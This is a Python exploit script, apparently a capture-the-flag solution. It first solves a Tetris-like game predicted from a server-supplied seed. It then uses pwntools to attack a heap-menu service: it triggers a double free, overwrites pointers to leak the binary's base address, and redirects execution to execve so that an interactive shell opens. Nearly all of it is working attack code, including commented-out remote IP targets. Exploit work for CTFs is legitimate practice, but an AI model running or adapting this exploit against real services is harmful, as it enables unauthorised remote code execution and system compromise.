import random
import ctypes
import time
import sys


def print(s):
    sys.stderr.write(str(s))
    sys.stderr.write("\n")

Y1 = 1
Y2 = 1 << 4
Y4 = 1 << 8
Y8 = 1 << 12

Y2BOARD = [0, Y1, Y2, Y1|Y2, Y4, Y4|Y1, Y4|Y2, Y4|Y2|Y1, Y8, Y8|Y1, Y8|Y2, Y8|Y2|Y1, Y8|Y4, Y8|Y4|Y1, Y8|Y4|Y2, Y8|Y4|Y2|Y1]

XF = 0xF
YF = 0b0001000100010001

def int_to_tetris(data):
    x, y = data & 0xF, (data >> 4) & 0xF
    pos = (data >> 8) & 0xF
    pos_x, pos_y = pos & 0x3, (pos >> 2) & 0x3
    res = (x << (4 * pos_x)) | (Y2BOARD[y] << pos_y)
    return res

def tetris_to_list(tetris):
    tmp = bin(tetris)[2:].zfill(16)[::-1]
    result = [ [int(tmp[4*i+j]) for j in range(4)] for i in range(4)]
    return result 

def tetris_to_graph(tetris):
    tmp = tetris_to_list(tetris)
    result = ""
    for i in range(4):
        result += f"|{''.join(map(str, tmp[i]))}|\n"
    return result

def get_tetris_statis(tetris):
    xx = [0 for _ in range(4)]
    yy = [0 for _ in range(4)]
    for i in range(4):
        for j in range(4):
            xx[i] += (tetris >> (4*i+j)) & 1
            yy[i] += (tetris >> (4*j+i)) & 1
    return xx, yy

def gettetris_statis_score(statis, location):
    xx, yy = statis
    xx_result = 0
    yy_result = 0
    ave = sum(xx) / len(xx)
    for i in range(len(xx)):
        xx_result += (xx[i] - ave) ** 2

    ave = sum(yy) / len(yy)
    for i in range(len(yy)):
        yy_result += (yy[i] - ave) ** 2
    
    ave = (xx_result + yy_result) / 2
    result = (xx_result - ave) ** 2 + (yy_result - ave) ** 2
    return result + location * 20
    #return xx_result, yy_result, result

def rox(tetris):
    new_tetris = (tetris << 4) & 0xFFFF
    new_tetris |= (tetris >> 12)
    return new_tetris

def roy(tetris):
    return ((tetris << 1) & 0xEEEE) | ((tetris >> 3) & 0x1111)

def eliminate_tetris(tetris):
    point = 0
    for i in range(4):
        current_check = XF << (4*i)
        if (tetris & current_check) == current_check:
            point += 1
            tetris = tetris & ~current_check
    for j in range(4):
        current_check = YF << (j)
        if (tetris & current_check) == current_check:
            point += 1
            tetris = tetris & ~current_check
    return point, tetris

class Solver:
    INIT_LEVEL = 4
    GAME_HIGH = 4

    def __init__(self, seed=0, is_print=False):
        self.is_print = is_print

        self.game_board = [0, 0, 0, 0, 0]
        self.current_tetris = 0
        self.is_first = True
        self.points = 0
        self.level = self.INIT_LEVEL
        self.solve_path = []
        self.seed = seed

    def tiny_rand(self):
        result = ((self.seed * 1103515245) + 12345) & 0x7fffffff
        self.seed = result
        return result

    def gen_tetris(self):
        data = self.tiny_rand()
        tetris = int_to_tetris(data)
        tetris_graph = tetris_to_graph(tetris)
        if self.is_print:
            print("new_tetris:")
            print(tetris_graph)
        return tetris
    
    def gen_tmp_tetrises(self):
        result = []
        for i in range(4):
            for j in range(4):
            #for j in range(4-i):
                tmp_tetris = self.current_tetris
                for _ in range(i): tmp_tetris = rox(tmp_tetris)
                for _ in range(j): tmp_tetris = roy(tmp_tetris)
                result.append(tmp_tetris)
        return result

    def append_tetris_to_tmp_gameboard(self, tmp_tetris):
        tmp_gameboard = self.game_board.copy()
        for i in range(self.GAME_HIGH):
            if tmp_gameboard[i+1] & tmp_tetris:
                tmp_gameboard[i] |= tmp_tetris
                break
        else:
            tmp_gameboard[self.GAME_HIGH] |= tmp_tetris
            i = self.GAME_HIGH
        return tmp_gameboard, i

    def update_gameboard(self, tmp_gameboard):
        self.game_board = tmp_gameboard
        self.eliminate_block()
        if self.is_print:
            #self.print_gb("current_gb:")
            print(self.points)
    
    def get_gb_nozero_num(self, tmp_gb):
        result = 0
        for i in range(5):
            if tmp_gb[4-i]: 
                result = i + 1
        return result

    def solve(self):
        while True:
            #input()
            self.current_tetris = self.gen_tetris()
            self.print_gb("priv_gb:")
            init_nz_num = self.get_gb_nozero_num(self.game_board)
            #if self.level != 0:
            #    point, self.current_tetris = eliminate_tetris(self.current_tetris)
            #    self.points += point

            if self.is_first or init_nz_num == 0:
                tmp_gb, location = self.append_tetris_to_tmp_gameboard(self.current_tetris)
                self.update_gameboard(tmp_gb)
                self.is_first = False
                self.solve_path.append(0)
                continue
            
            tmp_tetrises = self.gen_tmp_tetrises()
            same = []
            diff = []
            has_same = False
            for ti in range(len(tmp_tetrises)):
                item = tmp_tetrises[ti]
                tmp_gb, location = self.append_tetris_to_tmp_gameboard(item)
                if tmp_gb[0] != 0 or location == 0:
                    continue

                # check nozero_num
                new_nz_num = self.get_gb_nozero_num(tmp_gb)
                if new_nz_num == init_nz_num:
                    same.append((tmp_gb, location, ti))
                    has_same = True
                elif has_same:
                    continue
                else:
                    diff.append((tmp_gb, location, ti))
            
            if len(same) + len(diff) == 0:
                return

            if has_same:
                self.level = 5 - init_nz_num
                score_record = {}
                for tmp_gb, location, ti in same:
                    lowest_statis = get_tetris_statis(tmp_gb[location])
                    current_socre = gettetris_statis_score(lowest_statis, location)
                    if current_socre not in score_record:
                        score_record[current_socre] = []
                    score_record[current_socre].append((tmp_gb, ti))
                high_score = max(score_record.keys())
                final_gb, ti = score_record[high_score][0]
                self.solve_path.append(ti)
            else:
                diff_record = {}
                score_record = {}
                self.level = 4 - init_nz_num
                for tmp_gb, location, ti in diff:
                    tmp_tetris = tmp_gb[location]
                    origin_tetris = tmp_gb[location+1]
                    diff_num = 0
                    for i in range(16):
                        if (tmp_tetris >> i) & 1:
                            #diff_num += ((origin_tetris >> i) & 1) ^ 1
                            diff_num += (origin_tetris >> i) & 1
                    if diff_num not in diff_record:
                        diff_record[diff_num] = []
                    diff_record[diff_num].append((tmp_gb, location, ti))
                #score_list = diff_record[min(diff_record.keys())]
                score_list = diff_record[max(diff_record.keys())]
                for tmp_gb, location, ti in score_list:
                    lowest_statis = get_tetris_statis(tmp_gb[location])
                    current_socre = gettetris_statis_score(lowest_statis, location)
                    if current_socre not in score_record:
                        score_record[current_socre] = []
                    score_record[current_socre].append((tmp_gb, ti))
                high_score = max(score_record.keys())
                final_gb, ti = score_record[high_score][0]
                self.solve_path.append(ti)
            if self.is_print:
                print("final_tetris:")
                print(tetris_to_graph(tmp_tetrises[ti]))
            
            self.update_gameboard(final_gb)
    
    def print_gb(self, msg):
        if self.is_print:
            print(msg)
            for i in range(5):
                print(tetris_to_graph(self.game_board[4-i]))
            print("="*0x30)

    def eliminate_block(self):
        tmp_level = self.GAME_HIGH
        while tmp_level > 0:
            f = 0
            current_gb = self.game_board[tmp_level]
            for i in range(4):
                current_checker = XF << (i*4)
                if (current_checker & current_gb) == current_checker:
                    f = 1
                    self.points += 1
                    self.eliminate_line(tmp_level, current_checker)
                    current_gb = self.game_board[tmp_level]

            for i in range(4):
                current_checker = YF << i
                if (current_checker & current_gb) == current_checker:
                    f = 1
                    self.points += 1
                    self.eliminate_line(tmp_level, current_checker)
                    current_gb = self.game_board[tmp_level]

            if f == 0:
                tmp_level -= 1
                
    def eliminate_line(self, level, current_checker):
        while (level > 0):
            self.game_board[level] = self.game_board[level] & ~current_checker
            self.game_board[level] |= (self.game_board[level - 1] & current_checker)
            level -= 1

    def path_to_output(self):
        output = []
        for item in self.solve_path:
            xx = item % 4
            yy = item // 4
            if xx == 0: xx += 4
            if yy == 0: yy += 4
            tmp = b"0"*(4-yy)+b"1"*yy
            tmp += b"0"*(4-xx)+b"1"*xx
            output.append(int(tmp, 2))
        return bytes(output)



from pwn import *
import os

# context.log_level = "debug"

#os.chdir("./admin_output")

# with process("./main") as p:
#p = process("./main")
#p = remote("111.186.58.164", "30333")
#p = remote("10.211.55.2", "30333")
p = remote("127.0.0.1", "30333")

p.sendafter("name:\n", "/bin/sh\x00")
p.sendlineafter("choice:", "1")
p.recvuntil(": ")
timestamp = p.recvline().strip()
p.success(timestamp)
timestamp = int(timestamp)

solver = Solver(timestamp, 0)
solver.solve()

print(solver.points)

result = solver.path_to_output()
assert b"\n" not in result
assert b"\x00" not in result
#print(len(result))
print(result.hex())
p.sendline(result)
#p.interactive() 

r = p

def send_cmd(cmd):
    r.sendlineafter("choice:", str(cmd))

def admin_setseed(seed):
    r.sendlineafter("choice:", "6")
    r.sendlineafter("You cheat code please:", str(seed))

def disableFASLR():
    r.sendlineafter("choice:", "7")

def malloc(size):
    r.sendlineafter("choice:", "1")
    r.sendlineafter("size?", str(size))

def edit(idx, size, content):
    r.sendlineafter("choice:", "2")
    r.sendlineafter("index?", str(idx))
    r.sendlineafter("size?", str(size))
    r.send(content)

def show(idx):
    r.sendlineafter("choice:", "3")
    r.sendlineafter("index?", str(idx))

def free(idx):
    r.sendlineafter("choice:", "4")
    r.sendlineafter("index?", str(idx))

# r.sendlineafter("What's your name:", "/bin/sh")
# r.sendafter("What's your name:", "/bin/sh\x00")

# backdoor to get admin
# send_cmd("666")
send_cmd("3")
admin_setseed(1182721)

malloc(0x100)
malloc(0x100)
malloc(32)          # 0
malloc(40)          # 1
malloc(32)          # 2
malloc(40)          # 3
malloc(40)          # 4 padding

free(0+2)
free(1+2)
free(2+2)
free(3+2)

disableFASLR()      # double free

admin_setseed(32)
malloc(32)          # 0
payload = p64(0x700000000+0x128) + p64(0x700000000+0x128)

free(1)
# free(0)

import binascii
print(binascii.hexlify(payload))
edit(2, len(payload), payload)



malloc(32)          # 1
malloc(32)          # 2 == 0
malloc(32)

# ptr[4] 0x0000000700000130 size 0x20
# ptr[7] 0x0000000700000128 size 0
p1 = p64(0x300000)
edit(4, len(p1), p1)
show(1)

dyncall_addr = u64(r.recvline()[:-1].ljust(8, b"\x00"))
print(hex(dyncall_addr))
dyncall_offset = 0xA473
elf_base = dyncall_addr - dyncall_offset
print(f"Elf base: {hex(elf_base)}")

# admin_setseed(0)
# disableFASLR()

# func_block_st__bss_execve_addr = 0x700000000 + 0x1b8 + 31*8
# p1 = p64(func_block_st__bss_execve_addr)
# edit(4, len(p1), p1)
# show(1)
# func_block_st_ = u64(r.recvline()[:-1].ljust(8, b"\x00"))
# p1 = p64(func_block_st__bss_execve_addr)
# edit(4, len(p1), p1)
# show(1)
# execve_addr = 

puts_addr = elf_base + 0xCC030
p1 = p64(puts_addr)
edit(4, len(p1), p1)
execve_hash = b'\x8f\xbc\xa1\xbdY$7\xc8$\xb0\x99\x02qR}\xa1'
edit(1, len(execve_hash), execve_hash)

send_cmd("999")
send_cmd("999")

# r.sendline("echo 0ops!; exit")
# print(r.recvall())


r.interactive()

